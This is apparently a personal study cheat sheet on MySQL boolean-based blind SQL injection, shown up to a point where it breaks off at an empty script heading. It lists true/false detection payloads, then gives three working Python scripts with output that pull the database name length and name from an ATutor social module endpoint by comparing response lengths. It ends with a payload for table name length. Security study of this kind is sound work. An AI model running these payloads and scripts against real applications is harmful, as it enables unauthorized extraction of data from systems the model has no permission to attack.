## MySQL Boolean Based Blind SQLi

- Identifying the vulnerability:
> - My Opinion and experience (don't take it literally but I guess it's true (for me atleast)):
>   - Normally Boolean Based Blind SQLi can be detected by keeping an eye on `Content-Length` header when payload is introduced.
>   - A drastic change in response length when some query returns true as compared to when something returns false is a 100% sure giveaway of a vulnerability.
> - Payload
> - True  
> ```sql
> AND 1=1
> AND 1=1 AND 'a'='a'
> ```
> - False
> ```sql
> AND 1=1 and 'a'='b'
> ```

- Exploitation:
- Retrieving the length of database name
> - Keep an eye on `Content-Length`
> - Payload: to check if the database name is of length 15
> ```sql
> and (length(database())) = 15 --
> ```

> - Script:
> ```python
> import multiprocessing as mp
> import requests
>
> target = "http://localhost/atutor/mods/_standard/social/index_public.php"
>
> def db_length(number):
>     payload = f"te')/**/or/**/(length(database()))={number}#"
>     param = {'q': payload}
>     r = requests.get(target, param)
>     content_length = int(r.headers['Content-length'])
>     if content_length > 20:
>         print(number)
>
> if __name__ == "__main__":
>     print('[*] Retreiving Database Length: \n[*] Database length: ', end=' ')
>     processes = []
>     for number in range(30):
>         p = mp.Process(target=db_length, args=[number])
>         p.start()
>         processes.append(p)
>     for process in processes:
>         process.join()
>
>     
> ```
> - Output:
> ```
>  python .\atutor_dblength.py
> [*] Retreiving Database Length:
> [*] Database length: 6
> ```

- Retrieving the database name
> - We should use ASCII function coz most of the time single quotes or double quotes might cause errors or problems.
> - Refer the following to see char to ascii conversion: https://www.rapidtables.com/code/text/ascii-table.html
> - Payload
> ```sql
> and (select ascii(substring(database(),1, 1)) = 110)#
> ```

> - Script (Slow)
> ```python
> import requests
>
> def atutor_dbRetrieval():
>     target = "http://localhost/atutor/mods/_standard/social/index_public.php"
>     i = 1
>     final_string = ""
>     prev_length = -1
>     current_length = len(final_string)
>     while prev_length < current_length:
>         for j in range(32, 256):
>             payload = f"te')/**/or/**/(select/**/ascii(substring(database(),{i},1))={j})#"
>             param = {'q': payload}
>             r = requests.get(target, param)
>             content_length = int(r.headers['Content-length'])
>             if content_length > 20:
>                 final_string += chr(j)
>                 current_length = len(final_string.strip())
>                 print(final_string)
>                 break
>         prev_length += 1
>         i += 1
>     return final_string
>
> if __name__ == "__main__":
>     print("[+] Retrieving Database name: ....")
>     print("[+] Database Version: ", atutor_dbRetrieval())
>     print("[+] Done")
> ```
> ```
> Output:
> python .\atutor_dbRetrieval.py
> [+] Retrieving Database name: ....
> a
> at
> atu
> atut
> atuto
> atutor
> [+] Database Version:  atutor
> [+] Done
> ```

> - Script (Multi-threaded and Multi-Processed)(Fast):
> ```python
> import requests
> import concurrent.futures
>
> target = "http://localhost/atutor/mods/_standard/social/index_public.php"
> final_string = {}
>
> def db_length(number):
>     payload = f"te')/**/or/**/(length(database()))={number}#"
>     param = {'q': payload}
>     r = requests.get(target, param)
>     content_length = int(r.headers['Content-length'])
>     if content_length > 20:
>         return number
>
>     
> def atutor_dbRetrieval(l):
>     for j in range(32, 256):
>         payload = f"te')/**/or/**/(select/**/ascii(substring(database(),{l},1))={j})#"
>         param = {'q': payload}
>         r = requests.get(target, param)
>         content_length = int(r.headers['Content-length'])
>         if content_length > 20:
>             final_string[l-1] = chr(j)
>             print(''.join(final_string[i] for i in sorted(final_string.keys())))
>             
>
>
> if __name__ == "__main__":
>     print('[*] Retreiving Database Length: \n[*] Database length: ', end=' ')
>     
>     db_len = 0
>     with concurrent.futures.ProcessPoolExecutor() as executor:
>         results = [executor.submit(db_length, _) for _ in range(30)]
>         
>         for f in concurrent.futures.as_completed(results):
>             if f.result() != None:
>                 db_len = f.result()
>     print(db_len)
>         
>     print("[+] Retrieving Database name: ....")
>     with concurrent.futures.ThreadPoolExecutor() as executor:
>         results = [executor.submit(atutor_dbRetrieval, index) for index in range(db_len+1)]
>
>     print("[+] Database Name: ", end=" ")
>     print(''.join(final_string[i] for i in sorted(final_string.keys())))
>     print("[+] Done")
> ```
> ```
> Output:
> python .\atutor_dbRetrieval-fast.py
> [*] Retreiving Database Length:
> [*] Database length:  6
> [+] Retrieving Database name: ....
> a
> ao
> aor
> ator
> attor
> atutor
> [+] Database Name:  atutor
> [+] Done
> ```

- Retrieving the length of table name:
> - Payload:
> ```sql
> ' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 4 --+
> ```
> - Script:
> 
